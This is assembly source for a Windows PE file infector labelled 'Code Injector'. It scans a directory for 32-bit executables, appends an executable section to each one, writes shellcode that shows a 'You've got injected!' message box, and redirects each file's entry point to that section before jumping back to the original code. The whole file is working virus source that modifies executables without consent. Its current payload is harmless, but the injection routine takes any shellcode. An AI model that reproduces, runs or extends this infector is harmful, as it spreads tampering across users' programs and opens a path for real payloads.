.386
option casemap :none

INCLUDE \masm32\include\masm32rt.inc

includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib
INCLUDELIB \masm32\lib\masm32.lib

.data
    asterisk db "*", 0
    buffer db MAX_PATH dup(?)

    hFile dd ?
    bytesRead dd ?
    bytesWritten dd ?
    DOSHeader IMAGE_DOS_HEADER <>
    PEHeader IMAGE_NT_HEADERS <>
    lastSectionHeader IMAGE_SECTION_HEADER <>
    newSectionHeader IMAGE_SECTION_HEADER <>

    ; New section properties
    newSectionSize dd 1000h
    newSectionOffset dd ?
    injectText db "You've got injected!", 0
    injectTextOffset dd ?
    injectTitle db "Code Injector", 0
    injectTitleOffset dd ?
    shellCode db    6Ah, 00h, 
                    68h, 00h, 00h, 00h, 00h,
                    68h, 00h, 00h, 00h, 00h,
                    6Ah, 00h,
                    0E8h, 00h, 00h, 00h, 00h,
                    0e9h, 00h, 00h, 00h, 00h
    messageBoxARVA dd ?
    jmpRVA dd ?
    newEntryPoint dd ?
    moduleName db "user32.dll", 0
    procName db "MessageBoxA", 0

    searchPath db MAX_PATH dup(?)
    noFileMsg db "No file to infect in %s", 0

    usageFormat db "Usage: .\Injector.exe <directory_path>", 0
    cmdLine db MAX_PATH dup(?)

.code
alignUp proc alignSize:DWORD, alignment:DWORD
    mov eax, alignSize
    mov edx, alignment
    add eax, edx                ; alignSize + alignment
    dec eax                     ; alignSize + alignment - 1
    dec edx                     ; alignment - 1
    not edx                     ; ~(alignment - 1)
    and eax, edx                ; (alignSize + alignment - 1) & ~(alignment - 1)
    ret

alignUp endp

calculateJMPAddress PROC instructionAddr:DWORD, targetAddr:DWORD
    mov eax, instructionAddr
    mov ebx, targetAddr
    .if eax < ebx 
        sub ebx, eax
        mov eax, ebx
        ret
    .endif
    mov ecx, 0ffffffffh
    sub ecx, eax
    add ecx, ebx
    inc ecx
    mov eax, ecx
    ret
calculateJMPAddress endp

getMessageBoxAAddress proc
    LOCAL user32Module:DWORD
    LOCAL messageBoxAddr:DWORD
    invoke LoadLibraryA, addr moduleName
    mov user32Module, eax
    .if user32Module != NULL
        invoke GetProcAddress, user32Module, addr procName
        mov messageBoxAddr, eax
        invoke FreeLibrary, user32Module
        .if messageBoxAddr != NULL
            mov eax, messageBoxAddr
            ret

        .endif
        
    .endif
    xor eax, eax
    ret

getMessageBoxAAddress endp

isPE32 proc filename:DWORD
    invoke CreateFile, filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    mov hFile, eax
    .if hFile == INVALID_HANDLE_VALUE
        xor eax, eax
        ret
    .endif

    invoke ReadFile, hFile, addr DOSHeader, sizeof IMAGE_DOS_HEADER, addr bytesRead, NULL
    .if DOSHeader.e_magic != IMAGE_DOS_SIGNATURE
        jmp _exit
    .endif

    invoke SetFilePointer, hFile, DOSHeader.e_lfanew, NULL, FILE_BEGIN
    invoke ReadFile, hFile, addr PEHeader, sizeof IMAGE_NT_HEADERS, addr bytesRead, NULL
    .if PEHeader.Signature != IMAGE_NT_SIGNATURE
        jmp _exit
        
    .endif

    .if (PEHeader.OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC)
        jmp _exit
    .endif
    invoke CloseHandle, hFile
    mov eax, 1
    ret

_exit:
    invoke CloseHandle, hFile
    xor eax, eax
    ret

isPE32 endp

addSection proc filename:DWORD
    ; Open file
    invoke CreateFile, filename, GENERIC_READ or GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL

    ; Get DOS Header
    mov hFile, eax
    invoke ReadFile, hFile, addr DOSHeader, sizeof IMAGE_DOS_HEADER, addr bytesRead, NULL
    

    ; Get NT Headers
    invoke SetFilePointer, hFile, DOSHeader.e_lfanew, NULL, FILE_BEGIN
    invoke ReadFile, hFile, addr PEHeader, sizeof IMAGE_NT_HEADERS, addr bytesRead, NULL

    ; Get the last section header
    movzx ecx, PEHeader.FileHeader.NumberOfSections
    imul ecx, ecx, sizeof IMAGE_SECTION_HEADER
    sub ecx, sizeof IMAGE_SECTION_HEADER

    invoke SetFilePointer, hFile, ecx, NULL, FILE_CURRENT
    invoke ReadFile, hFile, addr lastSectionHeader, sizeof IMAGE_SECTION_HEADER, addr bytesRead, NULL

    ; Setup new section properties
    ; Calculate new section offset
    mov ebx, lastSectionHeader.PointerToRawData
    add ebx, lastSectionHeader.SizeOfRawData
    invoke alignUp, ebx, PEHeader.OptionalHeader.FileAlignment
    mov newSectionOffset, eax

    ; Calculate new section aligned size 
    mov ebx, newSectionSize
    invoke alignUp, ebx, PEHeader.OptionalHeader.SectionAlignment
    mov newSectionSize, eax

    ; Section VirtualSize and RawSize
    mov ebx, newSectionSize
    mov newSectionHeader.Misc.VirtualSize, ebx
    mov newSectionHeader.SizeOfRawData, ebx
    
    ; Section Raw Address
    mov ebx, newSectionOffset
    mov newSectionHeader.PointerToRawData, ebx

    ; Section Virtual Address
    mov eax, lastSectionHeader.VirtualAddress
    mov ebx, lastSectionHeader.Misc.VirtualSize
    add ebx, eax
    invoke alignUp, ebx, PEHeader.OptionalHeader.SectionAlignment
    mov newSectionHeader.VirtualAddress, eax

    ; Section Characteristics
    mov newSectionHeader.Characteristics, 0E00000E0h 

    ; Increase number of section
    mov bx, PEHeader.FileHeader.NumberOfSections
    inc bx
    mov PEHeader.FileHeader.NumberOfSections, bx

    ; Update size of the image
    mov eax, newSectionHeader.VirtualAddress
    mov ebx, newSectionHeader.Misc.VirtualSize
    add eax, ebx
    mov PEHeader.OptionalHeader.SizeOfImage, eax

    ; Write data to the PE file
    invoke SetFilePointer, hFile, DOSHeader.e_lfanew, NULL, FILE_BEGIN
    lea esi, PEHeader
    invoke WriteFile, hFile, esi, sizeof IMAGE_NT_HEADERS, addr bytesWritten, NULL

    movzx ebx, PEHeader.FileHeader.NumberOfSections
    dec ebx
    imul ebx, ebx, sizeof IMAGE_SECTION_HEADER
    invoke SetFilePointer, hFile, ebx, NULL, FILE_CURRENT
    lea esi, newSectionHeader
    invoke WriteFile, hFile, esi, sizeof IMAGE_SECTION_HEADER, addr bytesWritten, NULL

    ; Set EOF
    mov eax, newSectionSize
    mov ebx, newSectionOffset
    add ebx, eax
    invoke SetFilePointer, hFile, ebx, NULL, FILE_BEGIN
    invoke SetEndOfFile, hFile

    ; Write data to new section
    mov ebx, newSectionHeader.PointerToRawData
    add ebx, sizeof shellCode
    invoke SetFilePointer, hFile, ebx, NULL, FILE_BEGIN
    lea esi, injectText
    invoke WriteFile, hFile, esi, sizeof injectText, addr bytesWritten, NULL
    lea esi, injectTitle
    invoke WriteFile, hFile, esi, sizeof injectTitle, addr bytesWritten, NULL
    
    ; Calculate offset of data in shellcode
    mov ebx, sizeof shellCode
    mov injectTextOffset, ebx
    add ebx, sizeof injectText
    mov injectTitleOffset, ebx

    ; MessageBoxA's RVA for CALL instruction
    invoke getMessageBoxAAddress                    
    mov ebx, 19
    add ebx, PEHeader.OptionalHeader.ImageBase      
    add ebx, newSectionHeader.VirtualAddress        
    sub eax, ebx
    mov messageBoxARVA, eax 
    
    ; OEP's RVA for JMP instruction
    mov ebx, newSectionHeader.VirtualAddress
    add ebx, PEHeader.OptionalHeader.ImageBase
    add ebx, sizeof shellCode                               ; This should be the instructionAddress 

    mov ecx, PEHeader.OptionalHeader.AddressOfEntryPoint
    add ecx, PEHeader.OptionalHeader.ImageBase              ; This should be the targetAddress

    invoke calculateJMPAddress, ebx, ecx                    
    mov jmpRVA, eax

    ; Write the data into the shellcode
    lea edi, shellCode
    add edi, 3
    mov ebx, injectTitleOffset
    add ebx, newSectionHeader.VirtualAddress
    add ebx, PEHeader.OptionalHeader.ImageBase
    mov dword ptr [edi], ebx                                ; write injectTextOffset

    lea edi, shellCode
    add edi, 8
    mov ebx, injectTextOffset
    add ebx, newSectionHeader.VirtualAddress
    add ebx, PEHeader.OptionalHeader.ImageBase
    mov dword ptr [edi], ebx                                ; write injectTitleOffset

    lea edi, shellCode
    add edi, 15
    mov ebx, messageBoxARVA
    mov dword ptr [edi], ebx                                ; write messageBoxARVA

    lea edi, shellCode
    add edi, 20
    mov ebx, jmpRVA
    mov dword ptr [edi], ebx                                ; write jmpRVA

    ; Write shellCode into the file
    mov ebx, newSectionHeader.PointerToRawData
    invoke SetFilePointer, hFile, ebx, NULL, FILE_BEGIN
    lea esi, shellCode
    invoke WriteFile, hFile, esi, sizeof shellCode, addr bytesWritten, NULL

    ; Calculate new Entry Point and write it to file
    mov ebx, newSectionHeader.VirtualAddress
    mov PEHeader.OptionalHeader.AddressOfEntryPoint, ebx
    invoke SetFilePointer, hFile, DOSHeader.e_lfanew, NULL, FILE_BEGIN
    lea esi, PEHeader
    invoke WriteFile, hFile, esi, sizeof IMAGE_NT_HEADERS, addr bytesWritten, NULL
    invoke CloseHandle, hFile

    mov eax, 1
    ret

addSection endp

infectDirectory proc dirPath:DWORD
    LOCAL hFind:HANDLE
    LOCAL findFileData:WIN32_FIND_DATA

    invoke lstrcpy, addr buffer, dirPath
    invoke lstrcat, addr buffer, addr asterisk
    invoke FindFirstFile, addr buffer, addr findFileData
    .if eax == INVALID_HANDLE_VALUE
        invoke wsprintf, addr buffer, addr noFileMsg, dirPath
        invoke MessageBoxA, NULL, addr buffer, addr injectTitle, MB_OK
        xor eax, eax
        ret
    .endif

    mov hFind, eax
    .WHILE TRUE
        invoke lstrcpy, addr searchPath, dirPath
        invoke lstrcat, addr searchPath, addr findFileData.cFileName
        invoke lstrlen, addr searchPath
        mov ecx, eax
        mov byte ptr [searchPath + ecx], 0  ; Explicitly null-terminate
        invoke isPE32, addr searchPath
        .if eax == TRUE
            invoke addSection, addr searchPath 
        .endif

        invoke FindNextFile, hFind, addr findFileData
        .break .if !eax 
    .ENDW

    invoke FindClose, hFind
    mov eax, 1
    ret

infectDirectory endp

main proc 
    push offset cmdLine
    push 1
    call GetCL

    mov ebx, offset cmdLine
    cmp byte ptr [ebx], 0
    je _printUsage

    invoke infectDirectory, offset cmdLine
    invoke ExitProcess, 0

_printUsage:
    invoke MessageBox, NULL, offset usageFormat, offset injectTitle, MB_OK
    invoke ExitProcess, 0
main endp
end main